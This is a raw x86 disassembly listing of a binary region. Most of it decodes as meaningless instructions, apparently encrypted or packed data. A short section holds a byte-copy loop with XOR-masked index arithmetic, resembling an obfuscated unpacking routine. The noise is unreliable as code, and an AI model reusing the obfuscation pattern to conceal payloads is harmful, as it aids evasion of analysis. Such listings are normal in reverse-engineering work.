  403f0d:	stc    
  403f0e:	ret    0xfdd5
  403f11:	in     al,0xe5
  403f13:	(bad)  
  403f15:	fisttp WORD PTR [edx]
  403f17:	loope  0x403ef8
  403f19:	jmp    0xd92d3afb
  403f1e:	out    0xc6,eax
  403f20:	lock shl ecx,0xcc
  403f24:	mov    bl,0xe9
  403f26:	int3   
  403f27:	hlt    
  403f28:	out    dx,al
  403f29:	(bad)  
  403f2a:	clc    
  403f2b:	mov    edi,0xb8d6f8f0
  403f30:	fidivr WORD PTR [edi-0x1a3a2a10]
  403f36:	retf   0xebe7
  403f39:	loop   0x403f20
  403f3b:	fcmovnu st,st(6)
  403f3d:	lods   al,BYTE PTR ds:[esi]
  403f3e:	jmp    0xe128022a
  403f43:	test   ecx,0xd0ecd0fa
  403f49:	enter  0xd2eb,0xd2
  403f4d:	out    dx,eax
  403f4e:	in     al,dx
  403f4f:	add    ch,dl
  403f51:	loope  0x403f2f
  403f53:	hlt    
  403f54:	shl    ch,1
  403f56:	loope  0x403f22
  403f58:	leave  
  403f59:	cld    
  403f5a:	retf   0xdaef
  403f5d:	out    0xc0,eax
  403f5f:	fcomip st,st(0)
  403f61:	mov    bl,0xc2
  403f63:	loop   0x403f5e
  403f65:	frstpm(287 only) 
  403f67:	(bad)  
  403f68:	mov    esi,0xeef1f9c4
  403f6d:	int    0xf2
  403f6f:	hlt    
  403f70:	aad    0xf5
  403f72:	add    cl,bl
  403f74:	out    0x7,al
  403f76:	call   0xdd443676
  403f7b:	fsub   st,st(3)
  403f7d:	mov    bl,0xaf
  403f7f:	mov    al,0xc9
  403f81:	jmp    0xb8232036
  403f86:	mov    ch,0xb0
  403f88:	out    dx,al
  403f89:	idiv   edx
  403f8b:	fsub   st,st(3)
  403f8d:	in     al,dx
  403f8e:	out    0xe0,eax
  403f90:	(bad)  
  403f91:	(bad)  
  403f93:	(bad)  
  403f94:	(bad)  
  403f95:	call   0xfb0a4e5e
  403f9a:	pop    es
  403f9b:	cli    
  403f9c:	in     eax,0xa8
  403f9e:	loope  0x403f8d
  403fa0:	lock mov cl,0xef
  403fa3:	mov    ah,0xcd
  403fa5:	mov    ch,0xb7
  403fa7:	neg    cl
  403fa9:	shl    DWORD PTR [edx-0x18fc060f],1
  403faf:	rcr    bh,0xd4
  403fb2:	(bad)
  403fb5:	or     dh,dl
  403fb7:	(bad)  
  403fb8:	cld    
  403fb9:	add    edx,eax
  403fbb:	loope  0x403fae
  403fbd:	mov    eax,0xc8c2e0b1
  403fc2:	xlat   BYTE PTR ds:[ebx]
  403fc3:	neg    dl
  403fc5:	lock aad 0xc7
  403fc8:	mov    eax,0xf2c8ddd3
  403fcd:	aam    0x89
  403fcf:	inc    ebp
  403fd0:	hlt    
  403fd1:	jmp    0x403feb
  403fd6:	mov    eax,DWORD PTR [ebp-0x8]
  403fd9:	xor    eax,0x75108b5
  403fde:	mov    ecx,DWORD PTR [ebp-0xc]
  403fe1:	lea    eax,[ecx+eax*1+0x3272fb]
  403fe8:	mov    DWORD PTR [ebp-0xc],eax
  403feb:	mov    eax,DWORD PTR [ebp-0xc]
  403fee:	xor    ecx,ecx
  403ff0:	sub    eax,0x5424137
  403ff5:	sbb    ecx,0x0
  403ff8:	xor    eax,0x8a29a14b
  403ffd:	xor    ecx,0x0
  404000:	mov    edx,DWORD PTR [ebp+0x10]
  404003:	xor    esi,esi
  404005:	sub    edx,0x5424137
  40400b:	sbb    esi,0x0
  40400e:	xor    edx,0x8a29a14b
  404014:	xor    esi,0x0
  404017:	mov    DWORD PTR [ebp-0x24],eax
  40401a:	mov    DWORD PTR [ebp-0x20],ecx
  40401d:	mov    DWORD PTR [ebp-0x2c],edx
  404020:	mov    DWORD PTR [ebp-0x28],esi
  404023:	mov    eax,DWORD PTR [ebp-0x24]
  404026:	cmp    eax,DWORD PTR [ebp-0x2c]
  404029:	jne    0x40403b
  40402f:	mov    eax,DWORD PTR [ebp-0x20]
  404032:	cmp    eax,DWORD PTR [ebp-0x28]
  404035:	je     0x404071
  40403b:	mov    eax,DWORD PTR [ebp-0x4]
  40403e:	xor    eax,0x75108b5
  404043:	mov    ecx,DWORD PTR [ebp-0xc]
  404046:	lea    eax,[ecx+eax*1+0x3272fb]
  40404d:	mov    ecx,DWORD PTR [ebp-0x8]
  404050:	xor    ecx,0x75108b5
  404056:	add    ecx,0x3272fb
  40405c:	imul   ecx,DWORD PTR [ebp-0xc]
  404060:	mov    edx,DWORD PTR [ebp+0x8]
  404063:	mov    esi,DWORD PTR [ebp+0xc]
  404066:	mov    al,BYTE PTR [esi+eax*1]
  404069:	mov    BYTE PTR [edx+ecx*1],al
  40406c:	jmp    0x403fd6
  404071:	mov    eax,0xf89c85b3
  404076:	jmp    0x404085
  40407b:	jmp    0x404085
  404080:	mov    eax,0xf89c85b0
  404085:	pop    esi
  404086:	leave  
  404087:	ret    0xc
  40408a:	push   ebp
  40408b:	mov    ebp,esp
  40408d:	jmp    0x4063db
  404092:	in     al,0x68
  404094:	sbb    DWORD PTR gs:[ebp+0x34],esi
  404098:	in     al,0x74
  40409a:	sub    al,0x46
  40409c:	jnp    0x4040fa
  40409e:	pop    es
  40409f:	xchg   edi,eax
  4040a0:	mov    bl,0xf4
  4040a2:	stos   BYTE PTR es:[edi],al
  4040a3:	cwde   
  4040a4:	jnp    0x404121
  4040a6:	stos   BYTE PTR es:[edi],al
  4040a7:	cwde   
  4040a8:	jnp    0x404125
  4040aa:	enter  0xddde,0xd5
  4040ae:	ret    0xfbfd
  4040b1:	pop    es
  4040b2:	cli    
  4040b3:	hlt    
  4040b4:	loope  0x404083
  4040b6:	jmp    0xaa233f7f
  4040bb:	int    0xc2
  4040bd:	repz out dx,al
  4040bf:	jecxz  0x404087
  4040c1:	out    dx,eax
  4040c2:	mov    dh,0xd4
  4040c4:	(bad)  
  4040c6:	hlt    
  4040c7:	ret    
  4040c8:	mov    ebx,0xc6d5f3df
  4040cd:	sar    bl,0xc2
  4040d0:	cli    
  4040d1:	or     al,BYTE PTR [edi+eax*8]
  4040d4:	call   0xeb222bbe
  4040d9:	rcl    bl,0xef
  4040dc:	ret    0xb6ee
  4040df:	jmp    0xcdbf:0xdfe6eacb
  4040e6:	retf   
  4040e7:	(bad)  
  4040e9:	loop   0x4040e6
  4040eb:	(bad)  
  4040ec:	in     al,dx
  4040ed:	add    eax,DWORD PTR [eax+eax*1]
  4040f0:	fstp   TBYTE PTR [edi-0x1e200315]
  4040f6:	jecxz  0x4040e6
  4040f8:	push   cs
  4040f9:	icebp  
  4040fa:	scas   al,BYTE PTR es:[edi]
  4040fb:	shl    BYTE PTR [edi-0x573c2d0e],0xc8
  404102:	(bad)  
  404103:	(bad)  
  404104:	(bad)  
  404106:	mov    ch,0xd5
  404108:	add    ebx,eax
  40410a:	rcl    ch,1
  40410c:	loopne 0x404112
  40410e:	sti    
  40410f:	loope  0x4040ee
  404111:	cld    
  404112:	or     ah,al
  404114:	lds    ecx,FWORD PTR [ecx]
  404116:	or     bl,ah
  404118:	jecxz  0x40410c
  40411a:	in     eax,0xc3
  40411c:	in     al,0xb0
  40411e:	jmp    0xc8f9:0xd1afcaf7
  404125:	sti    
  404126:	icebp  
  404127:	mov    ebp,0xcdd2dfe1
  40412c:	(bad)  
  40412e:	(bad)  
  404130:	cld    
  404131:	add    bl,dh
  404133:	add    ecx,ebp
  404135:	jmp    0xdde6:0xaccff9fc
  40413c:	mov    ebp,0xf6d5eaf7
  404141:	leave  
  404142:	mov    ch,0xb0
  404144:	mov    esi,0xf3b5f3d6
  404149:	(bad)  
  40414a:	repz std 
  40414c:	sar    eax,cl
  40414e:	shl    eax,1
  404150:	loopne 0x40415b
  404152:	retf   0xcee5
  404155:	pandn  mm0,QWORD PTR [edx]
  404158:	int    0xc7
  40415a:	in     eax,0xac
  40415c:	rol    ebx,1
  40415e:	mov    ch,0xb1
  404160:	in     al,dx
  404161:	int    0xea
  404163:	mov    ebx,0xfcfdf9cd
  404168:	mov    ebx,0xdcbed701
  40416d:	loop   0x404149
  40416f:	stc    
  404170:	rol    DWORD PTR [ebx+edi*8],1
  404173:	(bad)  
  404174:	or     ah,bh
  404176:	fist   WORD PTR [edx]
  404178:	jecxz  0x40413f
  40417a:	mov    esp,0xb7efc7a8
  40417f:	rcl    esi,0xc5
  404182:	cmc    
  404183:	sti    
  404184:	hlt    
  404185:	mov    bl,0xb9
  404187:	sti    
  404188:	fsubp  st(0),st
  40418a:	sar    BYTE PTR [edi-0x8280e39],cl
  404190:	loope  0x404159
  404192:	in     al,0xef
  404194:	retf   0xe5e6
  404197:	(bad)  
  404199:	iret   
  40419a:	mov    al,0xb7
  40419c:	mov    esp,0xc1e6c4f0
  4041a1:	retf   
  4041a2:	out    0xda,eax
  4041a4:	mov    ah,0xcb
  4041a6:	cmc    
  4041a7:	mov    edx,0xecb6dbba
  4041ac:	out    0x3,al
  4041ae:	dec    ebx
  4041b0:	mov    esp,0xe9eb03cb
  4041b5:	retf   
  4041b6:	dec    DWORD PTR [eax+eax*1]
  4041b9:	lds    edi,FWORD PTR [ebp-0x1b0e4c19]
  4041bf:	shr    BYTE PTR [eax-0x4b252d16],1
  4041c5:	div    bl
  4041c7:	mov    cl,0xf6
  4041c9:	fstp   st(4)
  4041cb:	rcr    cl,0xcd
  4041ce:	(bad)  
  4041cf:	add    esi,eax
  4041d1:	jecxz  0x4041b3
  4041d3:	out    dx,eax
  4041d4:	or     ebp,ecx
  4041d6:	in     al,dx
  4041d7:	add    al,BYTE PTR [ecx+eiz*8]
  4041da:	loop   0x4041c3
  4041dc:	repz mov ebp,0xd6b5b3f5
  4041e2:	repz hlt 
  4041e4:	mov    edx,0xfed3f7c4
  4041e9:	lock add ah,dh
  4041ec:	mov    esi,0xfcf4e7f7
  4041f1:	call   0xb0a3fe0
  4041f6:	lds    ecx,FWORD PTR [esi]
  4041f8:	add    esi,DWORD PTR [edx-0x3c1b1e50]
  4041fe:	call   0xdff6eac5
  404203:	int3   
  404204:	stc    
  404205:	lds    edi,FWORD PTR [esp+edx*8+0xc3d6d9]
  40420c:	repnz ror DWORD PTR [ebx],0xfe
  404210:	xlat   BYTE PTR ds:[ebx]
  404211:	stc    
  404212:	enter  0xc7e2,0xe1
  404216:	jmp    0xd7e5:0xaee1edc8
  40421d:	call   0xd302f6f6
  404222:	loopne 0x40421b
  404224:	std    
  404225:	out    dx,eax
  404226:	repnz (bad) 
  404229:	fsub   st,st(3)
  40422b:	add    esi,edi
  40422d:	mul    ch
  40422f:	test   esp,0xdf0ef4e8
  404235:	hlt    
  404236:	retf   
  404237:	fmulp  st(5),st
  404239:	shl    bh,cl
  40423b:	in     al,dx
  40423c:	mov    esp,0xcae9eecd
  404241:	mov    edx,0xb3d7cfff
  404246:	leave  
  404247:	(bad)  
  404249:	fcmovnu st,st(1)
  40424b:	repz out 0xe1,eax
  40424e:	cmc    
  40424f:	sar    eax,1
  404251:	aad    0xf4
  404253:	or     edi,esp
  404255:	cld    
  404256:	add    al,0x7
  404258:	ffreep st(5)
  40425a:	xlat   BYTE PTR ds:[ebx]
  40425b:	out    dx,al
  40425c:	in     al,dx
  40425d:	(bad)  
  40425e:	jmp    0x404241
  404260:	fcmovne st,st(2)
  404262:	cmc    
  404263:	mov    dh,0xe4
  404265:	jmp    0x404243
  404267:	mov    esp,0xf2cfd1e9
  40426c:	ret    0x3c5
  40426f:	fcmove st,st(2)
  404271:	fdiv   st,st(6)
  404273:	or     ecx,DWORD PTR [edx]
  404275:	ret    
  404276:	retf   0xc4e4
  404279:	scas   eax,DWORD PTR es:[edi]
  40427a:	rcl    bl,cl
  40427c:	test   al,0xb0
  40427e:	mov    bh,0xfb
  404280:	shl    al,cl
  404282:	mov    edx,0xbbcabecd
  404287:	into   
  404288:	mov    esi,0xc6c7faef
  40428d:	ret    
  40428e:	fcmovnu st,st(0)
  404290:	ret    0xd4f8
  404293:	(bad)  
  404295:	push   cs
  404296:	(bad)  
  404298:	cli    
  404299:	lods   eax,DWORD PTR ds:[esi]
  40429a:	jmp    0xb1e5:0xd1d3e2cc
  4042a1:	mov    ecx,0xd4c6e8d9
  4042a6:	jmp    0xe31a197d
  4042ab:	shl    esi,0xda
  4042ae:	(bad)  
  4042af:	std    
  4042b0:	cld    
  4042b1:	or     cl,bh
  4042b3:	(bad)
  4042b6:	fcmovnb st,st(1)
  4042b8:	in     al,0xaa
  4042ba:	ret    
  4042bb:	div    DWORD PTR [esi-0x812482f]
  4042c1:	xlat   BYTE PTR ds:[ebx]
  4042c2:	f2xm1  
  4042c4:	rcr    cl,cl
  4042c6:	aam    0xf3
  4042c8:	shl    dl,1
  4042ca:	ret    0xdedb
  4042cd:	clc    
  4042ce:	clc    
  4042cf:	(bad)  
  4042d1:	cli    
  4042d2:	add    dl,ah
  4042d4:	ror    BYTE PTR [eax+ecx*1],0xf3
  4042d8:	or     eax,0xecf6c3c4
  4042dd:	loopne 0x4042cc
  4042df:	sti    
  4042e0:	aam    0xe1
  4042e2:	fcom   st(5)
  4042e4:	xlat   BYTE PTR ds:[ebx]
  4042e5:	lock jmp 0xd2303eda
  4042eb:	push   es
  4042ec:	rcr    al,0xd5
  4042ef:	loopne 0x4042ce
  4042f1:	or     bh,al
  4042f3:	pop    es
  4042f4:	fsub   st,st(0)
  4042f6:	add    ah,dl
  4042f8:	out    dx,al
  4042f9:	out    0xad,eax
  4042fb:	mov    esi,0xd3b3ade6
  404300:	test   al,0xf8
  404302:	fyl2x  
  404304:	(bad)  
  404306:	mov    ch,0xd2
  404308:	sti    
  404309:	idiv   bh
  40430b:	add    bl,al
  40430d:	(bad)  
  40430f:	lds    ecx,FWORD PTR [ebx]
  404311:	fcmovu st,st(5)
  404313:	jecxz  0x4042ef
  404315:	pop    es
  404316:	pop    es
  404317:	in     al,dx
  404318:	fild   QWORD PTR [ebp-0x3834093b]
  40431e:	ret    0xb1e2
  404321:	fdivr  DWORD PTR [edx-0x451a1b13]
  404327:	add    dl,al
  404329:	lock repz fucom st(2)
  40432d:	shr    bl,0xfa
  404330:	add    eax,0xd6fe0bc7
  404335:	in     al,dx
  404336:	jmp    0x404338
  404338:	or     eax,0xbcd7cee0
  40433d:	mov    ebp,0xb7c6d3e2
  404342:	in     eax,dx
  404343:	icebp  
  404344:	fucom  st(4)
  404346:	(bad)  
  404347:	shl    edx,1
  404349:	aad    0xcf
  40434b:	mov    eax,0xe30be0f3
  404350:	in     al,0x4
  404352:	fcmovu st,st(5)
  404354:	pop    es
  404355:	cli    
  404356:	hlt    
  404357:	into   
  404358:	push   cs
  404359:	retf   
  40435a:	(bad)  [ebp-0x3852363b]
  404360:	repz out dx,al
  404362:	cli    
  404363:	mov    edx,0xfbfcb5ef
  404368:	(bad)  
  40436a:	(bad)  
  40436b:	mov    edi,0xdbe5d5c1
  404370:	fcom   st(6)
  404372:	or     al,BYTE PTR [eax]
  404374:	(bad)
  404377:	push   es
  404378:	inc    ebp
  40437a:	mov    eax,0xaaeff1e4
  40437f:	mov    dh,0xf7
  404381:	fnop   
  404383:	icebp  
  404384:	fmul   st,st(5)
  404386:	fstp   st(7)
  404388:	mov    edi,0xffd007be
  40438d:	push   es
  40438e:	jmp    0x404355
  404390:	ret    
  404391:	jmp    0x40436f
  404393:	iret   
  404394:	or     ecx,edx
  404396:	jmp    0xe81d4da4
  40439b:	jecxz  0x404379
  40439d:	in     eax,0xc4
  40439f:	mov    ah,0xc4
  4043a1:	call   0xd6071374
  4043a6:	idiv   ah
  4043a8:	mov    edi,0xcc01e1
  4043ad:	loop   0x4043b6
  4043af:	fcomi  st,st(7)
  4043b1:	ret    0xcada
  4043b4:	jmp    0xda292b93
  4043b9:	int3   
  4043ba:	jecxz  0x404383
  4043bc:	repnz mul ah
  4043bf:	bnd ret 0xf8b2
  4043c3:	out    dx,al
  4043c4:	leave  
  4043c5:	aam    0xc4
  4043c7:	cld    
  4043c8:	int3   
  4043c9:	mov    edi,0xdbc3fcb6
  4043ce:	add    eax,0xb01f1c4
  4043d3:	sti    
  4043d4:	push   es
  4043d5:	retf   
  4043d6:	pop    es
  4043d7:	add    eax,0xafe6c9ec
  4043dc:	fmulp  st(0),st
  4043de:	loope  0x4043d4
  4043e0:	mov    dh,0xe8
  4043e2:	lock mov cl,0xfe
  4043e5:	jmp    0x4043df
  4043e7:	icebp  
  4043e8:	neg    ebx
  4043ea:	cli    
  4043eb:	ret    0xe1f3
  4043ee:	mov    esi,0xe3f7d9d1
  4043f3:	(bad)
  4043f6:	add    al,cl
  4043f8:	cld    
  4043f9:	stos   BYTE PTR es:[edi],al
  4043fa:	call   0xf03126c3
  4043ff:	(bad)  
  404400:	in     eax,0xb9
  404402:	rcl    ebp,1
  404404:	sti    
  404405:	fst    st(2)
  404407:	add    al,dl
  404409:	mov    edi,0xe2f0f5f9
  40440e:	in     eax,0xf3
  404410:	add    bh,al
  404412:	stc    
  404413:	hlt    
  404414:	(bad)  
  404415:	loop   0x4043eb
  404417:	(bad)  
  404419:	ret    
  40441a:	into   
  40441b:	scas   al,BYTE PTR es:[edi]
  40441c:	in     al,dx
  40441d:	rcl    eax,1
  40441f:	in     al,dx
  404420:	fnstenv [ecx-0x47143a20]
  404426:	hlt    
  404427:	mov    ch,0xdf
  404429:	mov    esi,0xfbedc0db
  40442e:	add    eax,0xe0fafdc1
  404433:	ror    BYTE PTR [edx],0xef
  404436:	std    
  404437:	call   0xec1cec4f
  40443c:	scas   al,BYTE PTR es:[edi]
  40443d:	scas   eax,DWORD PTR es:[edi]
  40443e:	retf   
  40443f:	mov    cl,0xb1
  404441:	fdivr  st,st(0)
  404443:	int    0xac
  404445:	retf   
  404446:	enter  0xd2d3,0xd8
  40444a:	sti    
  40444b:	(bad)  
  40444c:	aad    0xbf
  40444e:	cli    
  40444f:	loopne 0x404451
  404451:	lock loop 0x40441d
  404454:	cld    
  404455:	leave  
  404456:	hlt    
  404457:	iret   
  404458:	cli    
  404459:	scas   al,BYTE PTR es:[edi]
  40445a:	retf   
  40445b:	out    dx,eax
  40445c:	out    0xe3,eax
  40445e:	sar    edx,cl
  404460:	into   
  404461:	retf   0xd5e6
  404464:	mov    dh,0xd0
  404466:	std    
  404467:	aam    0xe8
  404469:	push   DWORD PTR [esi-0x2d330afe]
  40446f:	xlat   BYTE PTR ds:[ebx]
  404470:	ror    ecx,0xc2
  404473:	test   bh,0xf4
  404476:	cli    
  404477:	jmp    0xc825f359
  40447c:	enter  0xeab0,0xe3
  404480:	out    0xd1,al
  404482:	retf   
  404483:	into   
  404484:	test   ecx,0xe2f4f9f7
  40448a:	(bad)  
  40448b:	repz fld DWORD PTR ds:0x70bffd3
  404492:	in     al,0xf
  404494:	fsqrt  
  404496:	cld    
  404497:	std    
  404498:	in     eax,0xe9
  40449a:	out    dx,al
  40449b:	in     eax,0xcb
  40449d:	enter  0xd4e5,0xed
  4044a1:	loope  0x40449e
  4044a3:	clc    
  4044a4:	mov    bh,0xee
  4044a6:	mov    dh,0xdb
  4044a8:	lock jmp 0xfd2d14a4
  4044ae:	rol    BYTE PTR [edx],cl
  4044b0:	loopne 0x404499
  4044b2:	hlt    
  4044b3:	fucom  st(1)
  4044b5:	out    0x3,al
  4044b7:	in     al,0xec
  4044b9:	fsub   st,st(1)
  4044bb:	in     eax,dx
  4044bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044bd:	iret   
  4044be:	(bad)  
  4044bf:	jecxz  0x4044a3
  4044c1:	(bad)  
  4044c2:	mov    dh,0xc7
  4044c4:	int3   
  4044c5:	leave  
  4044c6:	cld    
  4044c7:	fmul   st(2),st
  4044c9:	repnz into 
  4044cb:	fnstsw WORD PTR [edi-0x2f090a43]
  4044d1:	rol    eax,1
  4044d3:	retf   
  4044d4:	aam    0x4
  4044d6:	add    bl,dh
  4044d8:	fsubr  QWORD PTR [ecx-0x29150e0e]
  4044de:	aad    0xec
  4044e0:	cli    
  4044e1:	enter  0xb6c6,0xf5
  4044e5:	int3   
  4044e6:	(bad)  
  4044e8:	idiv   eax
  4044ea:	cli    
  4044eb:	in     eax,dx
  4044ec:	ret    0xddc5
  4044ef:	ffree  st(3)
  4044f1:	test   DWORD PTR [edi],0xe2e1c00f
  4044f7:	fld    QWORD PTR [eax]
  4044f9:	shl    DWORD PTR [eax-0x4b30140d],cl
  4044ff:	enter  0xd0ed,0xbb
  404503:	cli    
  404504:	mov    ebx,0xfbe9ccf9
  404509:	sti    
  40450a:	xlat   BYTE PTR ds:[ebx]
  40450b:	(bad)  
  40450d:	mov    ebp,0xc0ffe501
  404512:	(bad)  
  404514:	dec    DWORD PTR [ebx]
  404516:	or     BYTE PTR [edi],cl
  404518:	loopne 0x4044f6
  40451a:	ret    0xc8f1
  40451d:	int3   
  40451e:	jmp    0xdc01fbd5
  404523:	(bad)  
  404524:	(bad)  
  404525:	jmp    0xb9fe:0x1b9e8d4
  40452c:	push   es
  40452d:	cld    
  40452e:	repnz stc 
  404530:	pop    es
  404531:	loop   0x404527
  404533:	jmp    0x40451d
  404535:	add    dl,al
  404537:	dec    DWORD PTR [eax+edi*4]
  40453a:	mov    ebp,0xb2b1e9d1
  40453f:	ret    
  404540:	ret    0xf7b7
  404543:	aam    0xb6
  404545:	fcmovbe st,st(5)
  404547:	retf   0xe0b0
  40454a:	fcmovbe st,st(0)
  40454c:	int    0xc5
  40454e:	jmp    0x404515
  404550:	add    edx,esp
  404552:	fdivr  st,st(5)
  404554:	jmp    0x40452a
  404556:	fisttp QWORD PTR [esi+ebp*8]
  404559:	les    edi,FWORD PTR [ebp-0xc102919]
  40455f:	mov    al,0xc5
  404561:	aad    0xee
  404563:	aam    0xd0
  404565:	mov    esi,0xf103f2d0
  40456a:	pop    es
  40456b:	sar    ecx,cl
  40456d:	int3   
  40456e:	fiadd  DWORD PTR [eax]
  404570:	mul    bh
  404572:	add    al,0xd8
  404574:	add    eax,ebp
  404576:	jmp    0xa4b2:0xc3dc02f9
  40457d:	jmp    0xb0ea:0xf6f0b3ea
  404584:	sti    
  404585:	fdivr  st,st(6)
  404587:	out    dx,al
  404588:	enter  0xf8db,0xb5
  40458c:	int    0xd9
  40458e:	sti    
  40458f:	jmp    0xd5d4:0xfbdaeb00
  404596:	adc    ecx,DWORD PTR [esp+eiz*8]
  404599:	out    dx,eax
  40459a:	fidivr WORD PTR [esi-0x10182358]
  4045a0:	call   0xc90d397c
  4045a5:	mov    ebx,0xd8dad5c4
  4045aa:	shl    DWORD PTR [ebp-0x25220a28],0xb
  4045b1:	ret    0xd6f8
  4045b4:	into   
  4045b5:	cli    
  4045b6:	retf   
  4045b7:	add    ah,bh
  4045b9:	fst    st(0)
  4045bb:	scas   al,BYTE PTR es:[edi]
  4045bc:	ret    
  4045bd:	mov    dl,0xd5
  4045bf:	loope  0x404569
  4045c1:	in     al,0xed
  4045c3:	lock mov esi,0xc9edceff
  4045c9:	out    dx,al
  4045ca:	add    ebx,ebp
  4045cc:	(bad)  
  4045ce:	mov    ebp,0xdddee7d1
  4045d3:	fcmovb st,st(7)
  4045d5:	in     eax,dx
  4045d6:	out    dx,eax
  4045d7:	sti    
  4045d8:	adc    bl,ah
  4045da:	fucomip st,st(0)
  4045dc:	iret   
  4045dd:	ret    0xc9ac
  4045e0:	jmp    0x4045cd
  4045e2:	cmc    
  4045e3:	int    0xe4
  4045e5:	fcom   st(5)
  4045e7:	fxch   st(4)
  4045e9:	add    esi,esp
  4045eb:	(bad)  
  4045ed:	push   es
  4045ee:	cmc    
  4045ef:	sti    
  4045f0:	(bad)  
  4045f2:	loop   0x4045f5
  4045f4:	cli    
  4045f5:	(bad)  
  4045f6:	sti    
  4045f7:	or     BYTE PTR [edx],dl
  4045f9:	fnsave [edx-0x34531218]
  4045ff:	div    BYTE PTR [ebp-0x2d4b0c26]
  404605:	in     al,dx
  404606:	cmc    
  404607:	clc    
  404608:	div    dh
  40460a:	repz loop 0x4045eb
  40460d:	rcr    cl,1
  40460f:	mov    esp,0xf502f5f4
  404614:	fcmove st,st(3)
  404616:	std    
  404617:	stc    
  404618:	or     ebp,DWORD PTR [edx-0x10530f11]
  40461e:	xlat   BYTE PTR ds:[ebx]
  40461f:	(bad)  [edi-0x25304905]
  404625:	shr    edi,1
  404627:	jmp    0xf3d5:0xf2faf7ca
  40462e:	add    DWORD PTR [ebp+0x900d9c3],edi
  404634:	out    0xd8,eax
  404636:	call   0xf806554e
  40463b:	rol    ecx,0xcf
  40463e:	mov    cl,0xd4
  404640:	rcl    ch,cl
  404642:	iret   
  404643:	mov    al,0xcd
  404645:	fdivr  st,st(5)
  404647:	(bad)  
  404648:	stc    
  404649:	add    dh,dl
  40464b:	lock (bad) 
  40464e:	add    ah,dh
  404650:	loop   0x404616
  404652:	cld    
  404653:	jecxz  0x40464d
  404655:	aam    0xe
  404657:	add    esp,ebp
  404659:	loopne 0x40461c
  40465b:	ror    cl,cl
  40465d:	mov    bl,0xed
  40465f:	test   eax,0xdad4f3e7
  404664:	div    esp
  404666:	cli    
  404667:	jecxz  0x404624
  404669:	mov    ebp,0xe1ccb800
  40466e:	mov    DWORD PTR ds:0xfcc9d8e4,0xfcfbf8f9
  404678:	fldcw  WORD PTR [ecx-0x11361a1a]
  40467e:	icebp  
  40467f:	in     al,0xd1
  404681:	mov    edx,0xede6d7ba
  404686:	into   
  404687:	mov    ebp,0xfeb8dbe8
  40468c:	in     eax,dx
  40468d:	add    bl,bl
  40468f:	or     bl,cl
  404691:	aam    0xcb
  404693:	aad    0xe8
  404695:	cli    
  404696:	or     ecx,esp
  404698:	add    BYTE PTR [ebx-0x22480f1e],dh
  40469e:	lods   al,BYTE PTR ds:[esi]
  40469f:	mul    edx
  4046a1:	jmp    0xf3f4:0xecbabac8
  4046a8:	iret   
  4046a9:	clc    
  4046aa:	mov    esi,0xfed3fcd0
  4046af:	fcmovb st,st(7)
  4046b1:	sti    
  4046b2:	add    cl,BYTE PTR [ebx]
  4046b4:	fmulp  st(7),st
  4046b6:	dec    DWORD PTR [eax]
  4046b8:	loopne 0x404672
  4046ba:	retf   0xe8ea
  4046bd:	enter  0xb1cb,0xeb
  4046c1:	stc    
  4046c2:	scas   al,BYTE PTR es:[edi]
  4046c3:	retf   
  4046c4:	out    dx,al
  4046c5:	mov    bh,0xbe
  4046c7:	xlat   BYTE PTR ds:[ebx]
  4046c8:	in     eax,dx
  4046c9:	out    dx,al
  4046ca:	in     al,dx
  4046cb:	aam    0xbc
  4046cd:	(bad)
  4046d0:	push   es
  4046d1:	add    ebp,edi
  4046d3:	fcmovnb st,st(5)
  4046d5:	retf   0xc5f3
  4046d8:	cli    
  4046d9:	in     eax,0xdf
  4046db:	loop   0x4046c9
  4046dd:	ret    
  4046de:	hlt    
  4046df:	shr    edx,1
  4046e1:	enter  0xbbf9,0xee
  4046e5:	leave  
  4046e6:	mov    dl,0xfb
  4046e8:	fidivr WORD PTR [esi-0x2f320a44]
  4046ee:	shl    dl,0xfa
  4046f1:	mov    cl,0x0
  4046f4:	loopne 0x4046ca
  4046f6:	fucomp st(5)
  4046f8:	retf   0xbdbd
  4046fb:	(bad)  
  4046fd:	in     eax,dx
  4046fe:	shl    ebx,0xda
  404701:	int    0xce
  404703:	(bad)  
  404704:	mov    edi,0xc3ccfdc5
  404709:	mov    esp,0xbcfcfa01
  40470e:	add    eax,0xe105e9f1
  404713:	in     eax,0xd5
  404715:	retf   0xe704
  404718:	or     DWORD PTR [eax-0x163e1716],edi
  40471e:	repnz (bad) 
  404720:	in     al,dx
  404721:	int    0xe0
  404723:	repz mov ch,0xe9
  404726:	into   
  404727:	mov    ah,0xd2
  404729:	mov    ecx,0xd2fbffcf
  40472e:	jmp    0x4046f3
  404730:	(bad)  
  404731:	add    ebp,edx
  404733:	loopne 0x404704
  404735:	jmp    0xd9322c1c
  40473a:	repnz out dx,al
  40473c:	ret    
  40473d:	into   
  40473e:	loop   0x404722
  404740:	enter  0xe9ca,0xf9
  404744:	in     al,0xe4
  404746:	(bad)  
  404748:	mov    edx,0xddd8f1d8
  40474d:	fild   WORD PTR [ecx]
  40474f:	add    al,0xe4
  404751:	jecxz  0x404719
  404753:	fdiv   st(6),st
  404755:	aad    0xcd
  404757:	jmp    0xd2051634
  40475c:	int3   
  40475d:	div    BYTE PTR [edx-0xf302838]
  404763:	fucomip st,st(2)
  404765:	icebp  
  404766:	mov    ecx,0xf3f1d5cf
  40476b:	(bad)  
  40476d:	in     al,dx
  40476e:	std    
  40476f:	sti    
  404770:	aam    0xf7
  404772:	leave  
  404773:	loopne 0x404740
  404775:	iret   
  404776:	add    ebx,ecx
  404778:	(bad)  
  404779:	fst    st(2)
  40477b:	rcr    esp,cl
  40477d:	shl    DWORD PTR [ebp-0x324b250b],0xd6
  404784:	lods   al,BYTE PTR ds:[esi]
  404785:	in     eax,dx
  404786:	lock cli 
  404788:	out    dx,al
  404789:	fdivr  QWORD PTR [edi-0x2e2e0504]
  40478f:	xlat   BYTE PTR ds:[ebx]
  404790:	div    bh
  404792:	(bad)  
  404793:	dec    dh
  404795:	int    0x2
  404797:	fsubrp st(4),st
  404799:	stos   DWORD PTR es:[edi],eax
  40479a:	jmp    0xb4e6:0xcbe6f0be
  4047a1:	loopne 0x40477e
  4047a3:	rcr    ecx,1
  4047a5:	clc    
  4047a6:	imul   bh
  4047a8:	cld    
  4047a9:	(bad)  
  4047aa:	(bad)  
  4047ac:	idiv   DWORD PTR [ecx+edi*8-0x19f61a1e]
  4047b3:	hlt    
  4047b4:	fnsetpm(287 only) 
  4047b6:	cld    
  4047b7:	adc    ecx,DWORD PTR [ecx]
  4047b9:	in     al,0xf3
  4047bb:	leave  
  4047bc:	int    0xf2
  4047be:	ret    
  4047bf:	mov    ch,0xd2
